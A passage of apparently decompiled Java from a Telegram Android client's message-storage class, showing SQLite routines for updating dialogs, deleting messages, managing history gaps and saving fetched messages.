            int a;
            ArrayList<Long> dialogsToUpdate = new ArrayList();
            if (messages.isEmpty()) {
                dialogsToUpdate.add(Long.valueOf((long) (-channelId)));
            } else {
                SQLitePreparedStatement state;
                if (channelId != 0) {
                    dialogsToUpdate.add(Long.valueOf((long) (-channelId)));
                    state = this.database.executeFast("UPDATE dialogs SET last_mid = (SELECT mid FROM messages WHERE uid = ? AND date = (SELECT MAX(date) FROM messages WHERE uid = ?)) WHERE did = ?");
                } else {
                    ids = TextUtils.join(",", messages);
                    cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT did FROM dialogs WHERE last_mid IN(%s)", new Object[]{ids}), new Object[0]);
                    while (cursor.next()) {
                        dialogsToUpdate.add(Long.valueOf(cursor.longValue(0)));
                    }
                    cursor.dispose();
                    state = this.database.executeFast("UPDATE dialogs SET last_mid = (SELECT mid FROM messages WHERE uid = ? AND date = (SELECT MAX(date) FROM messages WHERE uid = ? AND date != 0)) WHERE did = ?");
                }
                this.database.beginTransaction();
                for (a = 0; a < dialogsToUpdate.size(); a++) {
                    long did = ((Long) dialogsToUpdate.get(a)).longValue();
                    state.requery();
                    state.bindLong(1, did);
                    state.bindLong(2, did);
                    state.bindLong(3, did);
                    state.step();
                }
                state.dispose();
                this.database.commitTransaction();
            }
            if (additionalDialogsToUpdate != null) {
                for (a = 0; a < additionalDialogsToUpdate.size(); a++) {
                    Long did2 = (Long) additionalDialogsToUpdate.get(a);
                    if (!dialogsToUpdate.contains(did2)) {
                        dialogsToUpdate.add(did2);
                    }
                }
            }
            ids = TextUtils.join(",", dialogsToUpdate);
            TLRPC$messages_Dialogs dialogs = new TLRPC$TL_messages_dialogs();
            ArrayList<TLRPC$EncryptedChat> encryptedChats = new ArrayList();
            ArrayList<Integer> usersToLoad = new ArrayList();
            ArrayList<Integer> chatsToLoad = new ArrayList();
            ArrayList<Integer> encryptedToLoad = new ArrayList();
            cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT d.did, d.last_mid, d.unread_count, d.date, m.data, m.read_state, m.mid, m.send_state, m.date, d.pts, d.inbox_max, d.outbox_max, d.pinned, d.unread_count_i FROM dialogs as d LEFT JOIN messages as m ON d.last_mid = m.mid WHERE d.did IN(%s)", new Object[]{ids}), new Object[0]);
            while (cursor.next()) {
                TLRPC$TL_dialog dialog = new TLRPC$TL_dialog();
                dialog.id = cursor.longValue(0);
                dialog.top_message = cursor.intValue(1);
                dialog.read_inbox_max_id = cursor.intValue(10);
                dialog.read_outbox_max_id = cursor.intValue(11);
                dialog.unread_count = cursor.intValue(2);
                dialog.unread_mentions_count = cursor.intValue(13);
                dialog.last_message_date = cursor.intValue(3);
                dialog.pts = cursor.intValue(9);
                dialog.flags = channelId == 0 ? 0 : 1;
                dialog.pinnedNum = cursor.intValue(12);
                dialog.pinned = dialog.pinnedNum != 0;
                dialogs.dialogs.add(dialog);
                NativeByteBuffer data = cursor.byteBufferValue(4);
                if (data != null) {
                    TLRPC$Message message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                    data.reuse();
                    MessageObject.setUnreadFlags(message, cursor.intValue(5));
                    message.id = cursor.intValue(6);
                    message.send_state = cursor.intValue(7);
                    int date = cursor.intValue(8);
                    if (date != 0) {
                        dialog.last_message_date = date;
                    }
                    message.dialog_id = dialog.id;
                    dialogs.messages.add(message);
                    addUsersAndChatsFromMessage(message, usersToLoad, chatsToLoad);
                }
                int lower_id = (int) dialog.id;
                int high_id = (int) (dialog.id >> 32);
                if (lower_id != 0) {
                    if (high_id == 1) {
                        if (!chatsToLoad.contains(Integer.valueOf(lower_id))) {
                            chatsToLoad.add(Integer.valueOf(lower_id));
                        }
                    } else if (lower_id > 0) {
                        if (!usersToLoad.contains(Integer.valueOf(lower_id))) {
                            usersToLoad.add(Integer.valueOf(lower_id));
                        }
                    } else if (!chatsToLoad.contains(Integer.valueOf(-lower_id))) {
                        chatsToLoad.add(Integer.valueOf(-lower_id));
                    }
                } else if (!encryptedToLoad.contains(Integer.valueOf(high_id))) {
                    encryptedToLoad.add(Integer.valueOf(high_id));
                }
            }
            cursor.dispose();
            if (!encryptedToLoad.isEmpty()) {
                getEncryptedChatsInternal(TextUtils.join(",", encryptedToLoad), encryptedChats, usersToLoad);
            }
            if (!chatsToLoad.isEmpty()) {
                getChatsInternal(TextUtils.join(",", chatsToLoad), dialogs.chats);
            }
            if (!usersToLoad.isEmpty()) {
                getUsersInternal(TextUtils.join(",", usersToLoad), dialogs.users);
            }
            if (!dialogs.dialogs.isEmpty() || !encryptedChats.isEmpty()) {
                MessagesController.getInstance().processDialogsUpdate(dialogs, encryptedChats);
            }
        } catch (Exception e) {
            FileLog.e(e);
        }
    }

    public void updateDialogsWithDeletedMessages(final ArrayList<Integer> messages, final ArrayList<Long> additionalDialogsToUpdate, boolean useQueue, final int channelId) {
        if (!messages.isEmpty() || channelId != 0) {
            if (useQueue) {
                this.storageQueue.postRunnable(new Runnable() {
                    public void run() {
                        MessagesStorage.this.updateDialogsWithDeletedMessagesInternal(messages, additionalDialogsToUpdate, channelId);
                    }
                });
            } else {
                updateDialogsWithDeletedMessagesInternal(messages, additionalDialogsToUpdate, channelId);
            }
        }
    }

    public ArrayList<Long> markMessagesAsDeleted(final ArrayList<Integer> messages, boolean useQueue, final int channelId) {
        if (messages.isEmpty()) {
            return null;
        }
        if (!useQueue) {
            return markMessagesAsDeletedInternal((ArrayList) messages, channelId);
        }
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                MessagesStorage.this.markMessagesAsDeletedInternal(messages, channelId);
            }
        });
        return null;
    }

    private ArrayList<Long> markMessagesAsDeletedInternal(int channelId, int mid) {
        try {
            Iterator it;
            ArrayList<Long> arrayList = new ArrayList();
            HashMap<Long, Integer[]> dialogsToUpdate = new HashMap();
            long maxMessageId = ((long) mid) | (((long) channelId) << 32);
            ArrayList<File> filesToDelete = new ArrayList();
            int currentUser = UserConfig.getClientUserId();
            SQLiteCursor cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT uid, data, read_state, out, mention FROM messages WHERE uid = %d AND mid <= %d", new Object[]{Integer.valueOf(-channelId), Long.valueOf(maxMessageId)}), new Object[0]);
            while (cursor.next()) {
                try {
                    long did = cursor.longValue(0);
                    if (did != ((long) currentUser)) {
                        int read_state = cursor.intValue(2);
                        if (cursor.intValue(3) == 0) {
                            Integer num;
                            Integer[] unread_count = (Integer[]) dialogsToUpdate.get(Long.valueOf(did));
                            if (unread_count == null) {
                                unread_count = new Integer[]{Integer.valueOf(0), Integer.valueOf(0)};
                                dialogsToUpdate.put(Long.valueOf(did), unread_count);
                            }
                            if (read_state < 2) {
                                num = unread_count[1];
                                unread_count[1] = Integer.valueOf(unread_count[1].intValue() + 1);
                            }
                            if (read_state == 0 || read_state == 2) {
                                num = unread_count[0];
                                unread_count[0] = Integer.valueOf(unread_count[0].intValue() + 1);
                            }
                        }
                        if (((int) did) == 0) {
                            NativeByteBuffer data = cursor.byteBufferValue(1);
                            if (data != null) {
                                TLRPC$Message message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                                data.reuse();
                                if (message == null) {
                                    continue;
                                } else if (message.media instanceof TLRPC$TL_messageMediaPhoto) {
                                    it = message.media.photo.sizes.iterator();
                                    while (it.hasNext()) {
                                        file = FileLoader.getPathToAttach((TLRPC$PhotoSize) it.next());
                                        if (file != null && file.toString().length() > 0) {
                                            filesToDelete.add(file);
                                        }
                                    }
                                } else if (message.media instanceof TLRPC$TL_messageMediaDocument) {
                                    file = FileLoader.getPathToAttach(message.media.document);
                                    if (file != null && file.toString().length() > 0) {
                                        filesToDelete.add(file);
                                    }
                                    file = FileLoader.getPathToAttach(message.media.document.thumb);
                                    if (file != null && file.toString().length() > 0) {
                                        filesToDelete.add(file);
                                    }
                                }
                            } else {
                                continue;
                            }
                        } else {
                            continue;
                        }
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
            cursor.dispose();
            FileLoader.getInstance().deleteFiles(filesToDelete, 0);
            for (Entry<Long, Integer[]> entry : dialogsToUpdate.entrySet()) {
                Long did2 = (Long) entry.getKey();
                Integer[] counts = (Integer[]) entry.getValue();
                cursor = this.database.queryFinalized("SELECT unread_count, unread_count_i FROM dialogs WHERE did = " + did2, new Object[0]);
                int old_unread_count = 0;
                int old_mentions_count = 0;
                if (cursor.next()) {
                    old_unread_count = cursor.intValue(0);
                    old_mentions_count = cursor.intValue(1);
                }
                cursor.dispose();
                arrayList.add(did2);
                SQLitePreparedStatement state = this.database.executeFast("UPDATE dialogs SET unread_count = ?, unread_count_i = ? WHERE did = ?");
                state.requery();
                state.bindInteger(1, Math.max(0, old_unread_count - counts[0].intValue()));
                state.bindInteger(2, Math.max(0, old_mentions_count - counts[1].intValue()));
                state.bindLong(3, did2.longValue());
                state.step();
                state.dispose();
            }
            this.database.executeFast(String.format(Locale.US, "DELETE FROM messages WHERE uid = %d AND mid <= %d", new Object[]{Integer.valueOf(-channelId), Long.valueOf(maxMessageId)})).stepThis().dispose();
            this.database.executeFast(String.format(Locale.US, "DELETE FROM media_v2 WHERE uid = %d AND mid <= %d", new Object[]{Integer.valueOf(-channelId), Long.valueOf(maxMessageId)})).stepThis().dispose();
            this.database.executeFast("DELETE FROM media_counts_v2 WHERE 1").stepThis().dispose();
            return arrayList;
        } catch (Exception e2) {
            FileLog.e(e2);
            return null;
        }
    }

    public ArrayList<Long> markMessagesAsDeleted(final int channelId, final int mid, boolean useQueue) {
        if (!useQueue) {
            return markMessagesAsDeletedInternal(channelId, mid);
        }
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                MessagesStorage.this.markMessagesAsDeletedInternal(channelId, mid);
            }
        });
        return null;
    }

    private void fixUnsupportedMedia(TLRPC$Message message) {
        if (message != null) {
            if (message.media instanceof TLRPC$TL_messageMediaUnsupported_old) {
                if (message.media.bytes.length == 0) {
                    message.media.bytes = new byte[1];
                    message.media.bytes[0] = (byte) 73;
                }
            } else if (message.media instanceof TLRPC$TL_messageMediaUnsupported) {
                message.media = new TLRPC$TL_messageMediaUnsupported_old();
                message.media.bytes = new byte[1];
                message.media.bytes[0] = (byte) 73;
                message.flags |= 512;
            }
        }
    }

    private void doneHolesInTable(String table, long did, int max_id) throws Exception {
        if (max_id == 0) {
            this.database.executeFast(String.format(Locale.US, "DELETE FROM " + table + " WHERE uid = %d", new Object[]{Long.valueOf(did)})).stepThis().dispose();
        } else {
            this.database.executeFast(String.format(Locale.US, "DELETE FROM " + table + " WHERE uid = %d AND start = 0", new Object[]{Long.valueOf(did)})).stepThis().dispose();
        }
        SQLitePreparedStatement state = this.database.executeFast("REPLACE INTO " + table + " VALUES(?, ?, ?)");
        state.requery();
        state.bindLong(1, did);
        state.bindInteger(2, 1);
        state.bindInteger(3, 1);
        state.step();
        state.dispose();
    }

    public void doneHolesInMedia(long did, int max_id, int type) throws Exception {
        SQLitePreparedStatement state;
        if (type == -1) {
            if (max_id == 0) {
                this.database.executeFast(String.format(Locale.US, "DELETE FROM media_holes_v2 WHERE uid = %d", new Object[]{Long.valueOf(did)})).stepThis().dispose();
            } else {
                this.database.executeFast(String.format(Locale.US, "DELETE FROM media_holes_v2 WHERE uid = %d AND start = 0", new Object[]{Long.valueOf(did)})).stepThis().dispose();
            }
            state = this.database.executeFast("REPLACE INTO media_holes_v2 VALUES(?, ?, ?, ?)");
            for (int a = 0; a < 5; a++) {
                state.requery();
                state.bindLong(1, did);
                state.bindInteger(2, a);
                state.bindInteger(3, 1);
                state.bindInteger(4, 1);
                state.step();
            }
            state.dispose();
            return;
        }
        if (max_id == 0) {
            this.database.executeFast(String.format(Locale.US, "DELETE FROM media_holes_v2 WHERE uid = %d AND type = %d", new Object[]{Long.valueOf(did), Integer.valueOf(type)})).stepThis().dispose();
        } else {
            this.database.executeFast(String.format(Locale.US, "DELETE FROM media_holes_v2 WHERE uid = %d AND type = %d AND start = 0", new Object[]{Long.valueOf(did), Integer.valueOf(type)})).stepThis().dispose();
        }
        state = this.database.executeFast("REPLACE INTO media_holes_v2 VALUES(?, ?, ?, ?)");
        state.requery();
        state.bindLong(1, did);
        state.bindInteger(2, type);
        state.bindInteger(3, 1);
        state.bindInteger(4, 1);
        state.step();
        state.dispose();
    }

    public void closeHolesInMedia(long did, int minId, int maxId, int type) throws Exception {
        SQLiteCursor cursor;
        if (type < 0) {
            cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT type, start, end FROM media_holes_v2 WHERE uid = %d AND type >= 0 AND ((end >= %d AND end <= %d) OR (start >= %d AND start <= %d) OR (start >= %d AND end <= %d) OR (start <= %d AND end >= %d))", new Object[]{Long.valueOf(did), Integer.valueOf(minId), Integer.valueOf(maxId), Integer.valueOf(minId), Integer.valueOf(maxId), Integer.valueOf(minId), Integer.valueOf(maxId), Integer.valueOf(minId), Integer.valueOf(maxId)}), new Object[0]);
        } else {
            cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT type, start, end FROM media_holes_v2 WHERE uid = %d AND type = %d AND ((end >= %d AND end <= %d) OR (start >= %d AND start <= %d) OR (start >= %d AND end <= %d) OR (start <= %d AND end >= %d))", new Object[]{Long.valueOf(did), Integer.valueOf(type), Integer.valueOf(minId), Integer.valueOf(maxId), Integer.valueOf(minId), Integer.valueOf(maxId), Integer.valueOf(minId), Integer.valueOf(maxId), Integer.valueOf(minId), Integer.valueOf(maxId)}), new Object[0]);
        }
        ArrayList<Hole> holes = null;
        while (cursor.next()) {
            if (holes == null) {
                holes = new ArrayList();
            }
            int holeType = cursor.intValue(0);
            int start = cursor.intValue(1);
            int end = cursor.intValue(2);
            if (start != end || start != 1) {
                holes.add(new Hole(holeType, start, end));
            }
        }
        cursor.dispose();
        if (holes != null) {
            for (int a = 0; a < holes.size(); a++) {
                Hole hole = (Hole) holes.get(a);
                if (maxId >= hole.end - 1 && minId <= hole.start + 1) {
                    this.database.executeFast(String.format(Locale.US, "DELETE FROM media_holes_v2 WHERE uid = %d AND type = %d AND start = %d AND end = %d", new Object[]{Long.valueOf(did), Integer.valueOf(hole.type), Integer.valueOf(hole.start), Integer.valueOf(hole.end)})).stepThis().dispose();
                } else if (maxId >= hole.end - 1) {
                    if (hole.end != minId) {
                        try {
                            this.database.executeFast(String.format(Locale.US, "UPDATE media_holes_v2 SET end = %d WHERE uid = %d AND type = %d AND start = %d AND end = %d", new Object[]{Integer.valueOf(minId), Long.valueOf(did), Integer.valueOf(hole.type), Integer.valueOf(hole.start), Integer.valueOf(hole.end)})).stepThis().dispose();
                        } catch (Exception e) {
                            try {
                                FileLog.e(e);
                            } catch (Exception e2) {
                                FileLog.e(e2);
                                return;
                            }
                        }
                    }
                    continue;
                } else if (minId > hole.start + 1) {
                    this.database.executeFast(String.format(Locale.US, "DELETE FROM media_holes_v2 WHERE uid = %d AND type = %d AND start = %d AND end = %d", new Object[]{Long.valueOf(did), Integer.valueOf(hole.type), Integer.valueOf(hole.start), Integer.valueOf(hole.end)})).stepThis().dispose();
                    SQLitePreparedStatement state = this.database.executeFast("REPLACE INTO media_holes_v2 VALUES(?, ?, ?, ?)");
                    state.requery();
                    state.bindLong(1, did);
                    state.bindInteger(2, hole.type);
                    state.bindInteger(3, hole.start);
                    state.bindInteger(4, minId);
                    state.step();
                    state.requery();
                    state.bindLong(1, did);
                    state.bindInteger(2, hole.type);
                    state.bindInteger(3, maxId);
                    state.bindInteger(4, hole.end);
                    state.step();
                    state.dispose();
                } else if (hole.start != maxId) {
                    try {
                        this.database.executeFast(String.format(Locale.US, "UPDATE media_holes_v2 SET start = %d WHERE uid = %d AND type = %d AND start = %d AND end = %d", new Object[]{Integer.valueOf(maxId), Long.valueOf(did), Integer.valueOf(hole.type), Integer.valueOf(hole.start), Integer.valueOf(hole.end)})).stepThis().dispose();
                    } catch (Exception e22) {
                        FileLog.e(e22);
                    }
                } else {
                    continue;
                }
            }
        }
    }

    private void closeHolesInTable(String table, long did, int minId, int maxId) throws Exception {
        SQLiteCursor cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT start, end FROM " + table + " WHERE uid = %d AND ((end >= %d AND end <= %d) OR (start >= %d AND start <= %d) OR (start >= %d AND end <= %d) OR (start <= %d AND end >= %d))", new Object[]{Long.valueOf(did), Integer.valueOf(minId), Integer.valueOf(maxId), Integer.valueOf(minId), Integer.valueOf(maxId), Integer.valueOf(minId), Integer.valueOf(maxId), Integer.valueOf(minId), Integer.valueOf(maxId)}), new Object[0]);
        ArrayList<Hole> holes = null;
        while (cursor.next()) {
            if (holes == null) {
                holes = new ArrayList();
            }
            int start = cursor.intValue(0);
            int end = cursor.intValue(1);
            if (start != end || start != 1) {
                holes.add(new Hole(start, end));
            }
        }
        cursor.dispose();
        if (holes != null) {
            for (int a = 0; a < holes.size(); a++) {
                Hole hole = (Hole) holes.get(a);
                if (maxId >= hole.end - 1 && minId <= hole.start + 1) {
                    this.database.executeFast(String.format(Locale.US, "DELETE FROM " + table + " WHERE uid = %d AND start = %d AND end = %d", new Object[]{Long.valueOf(did), Integer.valueOf(hole.start), Integer.valueOf(hole.end)})).stepThis().dispose();
                } else if (maxId >= hole.end - 1) {
                    if (hole.end != minId) {
                        try {
                            this.database.executeFast(String.format(Locale.US, "UPDATE " + table + " SET end = %d WHERE uid = %d AND start = %d AND end = %d", new Object[]{Integer.valueOf(minId), Long.valueOf(did), Integer.valueOf(hole.start), Integer.valueOf(hole.end)})).stepThis().dispose();
                        } catch (Exception e) {
                            try {
                                FileLog.e(e);
                            } catch (Exception e2) {
                                FileLog.e(e2);
                                return;
                            }
                        }
                    }
                    continue;
                } else if (minId > hole.start + 1) {
                    this.database.executeFast(String.format(Locale.US, "DELETE FROM " + table + " WHERE uid = %d AND start = %d AND end = %d", new Object[]{Long.valueOf(did), Integer.valueOf(hole.start), Integer.valueOf(hole.end)})).stepThis().dispose();
                    SQLitePreparedStatement state = this.database.executeFast("REPLACE INTO " + table + " VALUES(?, ?, ?)");
                    state.requery();
                    state.bindLong(1, did);
                    state.bindInteger(2, hole.start);
                    state.bindInteger(3, minId);
                    state.step();
                    state.requery();
                    state.bindLong(1, did);
                    state.bindInteger(2, maxId);
                    state.bindInteger(3, hole.end);
                    state.step();
                    state.dispose();
                } else if (hole.start != maxId) {
                    try {
                        this.database.executeFast(String.format(Locale.US, "UPDATE " + table + " SET start = %d WHERE uid = %d AND start = %d AND end = %d", new Object[]{Integer.valueOf(maxId), Long.valueOf(did), Integer.valueOf(hole.start), Integer.valueOf(hole.end)})).stepThis().dispose();
                    } catch (Exception e22) {
                        FileLog.e(e22);
                    }
                } else {
                    continue;
                }
            }
        }
    }

    public void putMessages(TLRPC$messages_Messages messages, long dialog_id, int load_type, int max_id, boolean createDialog) {
        final TLRPC$messages_Messages tLRPC$messages_Messages = messages;
        final int i = load_type;
        final long j = dialog_id;
        final int i2 = max_id;
        final boolean z = createDialog;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                int mentionCountUpdate = Integer.MAX_VALUE;
                try {
                    if (!tLRPC$messages_Messages.messages.isEmpty()) {
                        MessagesStorage.this.database.beginTransaction();
                        int minId;
                        if (i == 0) {
                            minId = ((TLRPC$Message) tLRPC$messages_Messages.messages.get(tLRPC$messages_Messages.messages.size() - 1)).id;
                            MessagesStorage.this.closeHolesInTable("messages_holes", j, minId, i2);
                            MessagesStorage.this.closeHolesInMedia(j, minId, i2, -1);
                        } else if (i == 1) {
                            maxId = ((TLRPC$Message) tLRPC$messages_Messages.messages.get(0)).id;
                            MessagesStorage.this.closeHolesInTable("messages_holes", j, i2, maxId);
                            MessagesStorage.this.closeHolesInMedia(j, i2, maxId, -1);
                        } else if (i == 3 || i == 2 || i == 4) {
                            if (i2 != 0 || i == 4) {
                                maxId = ((TLRPC$Message) tLRPC$messages_Messages.messages.get(0)).id;
                            } else {
                                maxId = Integer.MAX_VALUE;
                            }
                            minId = ((TLRPC$Message) tLRPC$messages_Messages.messages.get(tLRPC$messages_Messages.messages.size() - 1)).id;
                            MessagesStorage.this.closeHolesInTable("messages_holes", j, minId, maxId);
                            MessagesStorage.this.closeHolesInMedia(j, minId, maxId, -1);
                        }
                        int count = tLRPC$messages_Messages.messages.size();
                        SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO messages VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, NULL, ?, ?)");
                        SQLitePreparedStatement state2 = MessagesStorage.this.database.executeFast("REPLACE INTO media_v2 VALUES(?, ?, ?, ?, ?)");
                        SQLitePreparedStatement state5 = null;
                        TLRPC$Message botKeyboard = null;
                        int channelId = 0;
                        for (int a = 0; a < count; a++) {
                            SQLiteCursor cursor;
                            TLRPC$Message message = (TLRPC$Message) tLRPC$messages_Messages.messages.get(a);
                            long messageId = (long) message.id;
                            if (channelId == 0) {
                                channelId = message.to_id.channel_id;
                            }
                            if (message.to_id.channel_id != 0) {
                                messageId |= ((long) channelId) << 32;
                            }
                            if (i == -2) {
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT mid, data, ttl, mention, read_state FROM messages WHERE mid = %d", new Object[]{Long.valueOf(messageId)}), new Object[0]);
                                boolean exist = cursor.next();
                                if (exist) {
                                    AbstractSerializedData data = cursor.byteBufferValue(1);
                                    if (data != null) {
                                        TLRPC$Message oldMessage = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                                        data.reuse();
                                        if (oldMessage != null) {
                                            message.attachPath = oldMessage.attachPath;
                                            message.ttl = cursor.intValue(2);
                                        }
                                    }
                                    boolean oldMention = cursor.intValue(3) != 0;
                                    int readState = cursor.intValue(4);
                                    if (oldMention != message.mentioned) {
                                        if (mentionCountUpdate == Integer.MAX_VALUE) {
                                            SQLiteCursor cursor2 = MessagesStorage.this.database.queryFinalized("SELECT unread_count_i FROM dialogs WHERE did = " + j, new Object[0]);
                                            if (cursor2.next()) {
                                                mentionCountUpdate = cursor2.intValue(0);
                                            }
                                            cursor2.dispose();
                                        }
                                        if (oldMention) {
                                            if (readState <= 1) {
                                                mentionCountUpdate--;
                                            }
                                        } else if (message.media_unread) {
                                            mentionCountUpdate++;
                                        }
                                    }
                                }
                                cursor.dispose();
                                if (!exist) {
                                }
                            }
                            if (a == 0 && z) {
                                int pinned = 0;
                                int mentions = 0;
                                cursor = MessagesStorage.this.database.queryFinalized("SELECT pinned, unread_count_i FROM dialogs WHERE did = " + j, new Object[0]);
                                if (cursor.next()) {
                                    pinned = cursor.intValue(0);
                                    mentions = cursor.intValue(1);
                                }
                                cursor.dispose();
                                SQLitePreparedStatement state3 = MessagesStorage.this.database.executeFast("REPLACE INTO dialogs VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                                state3.bindLong(1, j);
                                state3.bindInteger(2, message.date);
                                state3.bindInteger(3, 0);
                                state3.bindLong(4, messageId);
                                state3.bindInteger(5, message.id);
                                state3.bindInteger(6, 0);
                                state3.bindLong(7, messageId);
                                state3.bindInteger(8, mentions);
                                state3.bindInteger(9, tLRPC$messages_Messages.pts);
                                state3.bindInteger(10, message.date);
                                state3.bindInteger(11, pinned);
                                state3.step();
                                state3.dispose();
                            }
                            MessagesStorage.this.fixUnsupportedMedia(message);
                            state.requery();
                            AbstractSerializedData nativeByteBuffer = new NativeByteBuffer(message.getObjectSize());
                            message.serializeToStream(nativeByteBuffer);
                            state.bindLong(1, messageId);
                            state.bindLong(2, j);
                            state.bindInteger(3, MessageObject.getUnreadFlags(message));
                            state.bindInteger(4, message.send_state);
                            state.bindInteger(5, message.date);
                            state.bindByteBuffer(6, (NativeByteBuffer) nativeByteBuffer);
                            state.bindInteger(7, MessageObject.isOut(message) ? 1 : 0);
                            state.bindInteger(8, message.ttl);
                            if ((message.flags & 1024) != 0) {
                                state.bindInteger(9, message.views);
                            } else {
                                state.bindInteger(9, MessagesStorage.this.getMessageMediaType(message));
                            }
                            state.bindInteger(10, 0);
                            state.bindInteger(11, message.mentioned ? 1 : 0);
                            state.step();
                            if (SharedMediaQuery.canAddMessageToMedia(message)) {
                                state2.requery();
                                state2.bindLong(1, messageId);
                                state2.bindLong(2, j);
                                state2.bindInteger(3, message.date);
                                state2.bindInteger(4, SharedMediaQuery.getMediaType(message));
                                state2.bindByteBuffer(5, (NativeByteBuffer) nativeByteBuffer);
                                state2.step();
                            }
                            nativeByteBuffer.reuse();
                            if (message.media instanceof TLRPC$TL_messageMediaWebPage) {
                                if (state5 == null) {
                                    state5 = MessagesStorage.this.database.executeFast("REPLACE INTO webpage_pending VALUES(?, ?)");
                                }
                                state5.requery();
                                state5.bindLong(1, message.media.webpage.id);
                                state5.bindLong(2, messageId);
                                state5.step();
                            }
                            if (i == 0 && MessagesStorage.this.isValidKeyboardToSave(message) && (botKeyboard == null || botKeyboard.id < message.id)) {
                                botKeyboard = message;
                            }
                        }
                        state.dispose();
                        state2.dispose();
                        if (state5 != null) {
                            state5.dispose();
                        }
                        if (botKeyboard != null) {
                            BotQuery.putBotKeyboard(j, botKeyboard);
                        }
                        MessagesStorage.this.putUsersInternal(tLRPC$messages_Messages.users);
                        MessagesStorage.this.putChatsInternal(tLRPC$messages_Messages.chats);
                        if (mentionCountUpdate != Integer.MAX_VALUE) {
                            MessagesStorage.this.database.executeFast(String.format(Locale.US, "UPDATE dialogs SET unread_count_i = %d WHERE did = %d", new Object[]{Integer.valueOf(mentionCountUpdate), Long.valueOf(j)})).stepThis().dispose();
                            HashMap<Long, Integer> hashMap = new HashMap();
                            hashMap.put(Long.valueOf(j), Integer.valueOf(mentionCountUpdate));
                            MessagesController.getInstance().processDialogsUpdateRead(null, hashMap);
                        }
                        MessagesStorage.this.database.commitTransaction();
                        if (z) {
                            MessagesStorage.getInstance().updateDialogsWithDeletedMessages(new ArrayList(), null, false, channelId);
                        }
                    } else if (i == 0) {
                        MessagesStorage.this.doneHolesInTable("messages_holes", j, i2);
                        MessagesStorage.this.doneHolesInMedia(j, i2, -1);
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public static void addUsersAndChatsFromMessage(TLRPC$Message message, ArrayList<Integer> usersToLoad, ArrayList<Integer> chatsToLoad) {
        int a;
        if (message.from_id != 0) {
            if (message.from_id > 0) {
                if (!usersToLoad.contains(Integer.valueOf(message.from_id))) {
                    usersToLoad.add(Integer.valueOf(message.from_id));
                }
            } else if (!chatsToLoad.contains(Integer.valueOf(-message.from_id))) {
                chatsToLoad.add(Integer.valueOf(-message.from_id));
            }
        }
        if (!(message.via_bot_id == 0 || usersToLoad.contains(Integer.valueOf(message.via_bot_id)))) {
            usersToLoad.add(Integer.valueOf(message.via_bot_id));
        }
        if (message.action != null) {
            if (!(message.action.user_id == 0 || usersToLoad.contains(Integer.valueOf(message.action.user_id)))) {
                usersToLoad.add(Integer.valueOf(message.action.user_id));
            }
            if (!(message.action.channel_id == 0 || chatsToLoad.contains(Integer.valueOf(message.action.channel_id)))) {
                chatsToLoad.add(Integer.valueOf(message.action.channel_id));
            }
            if (!(message.action.chat_id == 0 || chatsToLoad.contains(Integer.valueOf(message.action.chat_id)))) {
                chatsToLoad.add(Integer.valueOf(message.action.chat_id));
            }
            if (!message.action.users.isEmpty()) {
                for (a = 0; a < message.action.users.size(); a++) {
                    Integer uid = (Integer) message.action.users.get(a);
                    if (!usersToLoad.contains(uid)) {
                        usersToLoad.add(uid);
                    }
                }
            }
        }
        if (!message.entities.isEmpty()) {
            for (a = 0; a < message.entities.size(); a++) {
                TLRPC$MessageEntity entity = (TLRPC$MessageEntity) message.entities.get(a);
                if (entity instanceof TLRPC$TL_messageEntityMentionName) {
                    usersToLoad.add(Integer.valueOf(((TLRPC$TL_messageEntityMentionName) entity).user_id));
                } else if (entity instanceof TLRPC$TL_inputMessageEntityMentionName) {
                    usersToLoad.add(Integer.valueOf(((TLRPC$TL_inputMessageEntityMentionName) entity).user_id.user_id));
                }
            }
        }
        if (!(message.media == null || message.media.user_id == 0 || usersToLoad.contains(Integer.valueOf(message.media.user_id)))) {
            usersToLoad.add(Integer.valueOf(message.media.user_id));
        }
        if (message.fwd_from != null) {
            if (!(message.fwd_from.from_id == 0 || usersToLoad.contains(Integer.valueOf(message.fwd_from.from_id)))) {
                usersToLoad.add(Integer.valueOf(message.fwd_from.from_id));
            }
            if (!(message.fwd_from.channel_id == 0 || chatsToLoad.contains(Integer.valueOf(message.fwd_from.channel_id)))) {
                chatsToLoad.add(Integer.valueOf(message.fwd_from.channel_id));
            }
            if (message.fwd_from.saved_from_peer != null) {
                if (message.fwd_from.saved_from_peer.user_id != 0) {
                    if (!chatsToLoad.contains(Integer.valueOf(message.fwd_from.saved_from_peer.user_id))) {
                        usersToLoad.add(Integer.valueOf(message.fwd_from.saved_from_peer.user_id));
                    }
                } else if (message.fwd_from.saved_from_peer.channel_id != 0) {
                    if (!chatsToLoad.contains(Integer.valueOf(message.fwd_from.saved_from_peer.channel_id))) {
                        chatsToLoad.add(Integer.valueOf(message.fwd_from.saved_from_peer.channel_id));
                    }
                } else if (!(message.fwd_from.saved_from_peer.chat_id == 0 || chatsToLoad.contains(Integer.valueOf(message.fwd_from.saved_from_peer.chat_id)))) {
                    chatsToLoad.add(Integer.valueOf(message.fwd_from.saved_from_peer.chat_id));
                }
            }
        }
        if (message.ttl < 0 && !chatsToLoad.contains(Integer.valueOf(-message.ttl))) {
            chatsToLoad.add(Integer.valueOf(-message.ttl));
        }
    }

    public void getDialogs(final int offset, final int count) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                TLRPC$messages_Dialogs dialogs = new TLRPC$TL_messages_dialogs();
                ArrayList<TLRPC$EncryptedChat> encryptedChats = new ArrayList();
                ArrayList<Integer> usersToLoad = new ArrayList();
